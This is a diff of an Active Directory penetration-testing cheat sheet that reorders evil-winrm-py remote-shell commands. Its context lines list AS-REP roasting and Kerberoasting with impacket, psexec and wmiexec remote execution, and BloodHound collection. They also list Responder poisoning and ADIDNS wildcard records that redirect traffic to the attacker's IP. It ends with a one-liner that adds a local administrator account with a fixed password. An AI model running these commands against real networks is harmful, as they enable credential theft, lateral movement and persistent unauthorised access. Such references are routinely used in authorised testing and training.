@@ -224,9 +224,12 @@ impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -no-preauth 'NPUserjjones' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile computers
+evil-winrm-py -i $TARGET -u '$USERNAME' -p '$PASSWORD'
 impacket-psexec $DOM/'$USERNAME:$PASSWORD'@$TARGET
 impacket-wmiexec $DOM/'$USERNAME:$PASSWORD'@$TARGET 'whoami'
 impacket-smbclient $DOM/'$USERNAME:$PASSWORD'@$TARGET
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+evil-winrm-py -i $DC -r $DOM
 bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(description=*))" --attr description
 nxc ldap $TARGET --dns-server $TARGET -u '$USERNAME' -p '$PASSWORD' --bloodhound --use-kcache
 //$TARGET/$/Sharphound.exe --ldapusername $USERNAME --ldappassword $PASSWORD
@@ -238,9 +241,6 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action query --record '@
 sudo responder -I tun0 -v
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record '*'
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
-evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
-evil-winrm-py -i $TARGET -u $USERNAME -p $PASSWORD
-evil-winrm-py -i $DC -r $DOM
 
 ## Set Administrator Account
 net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
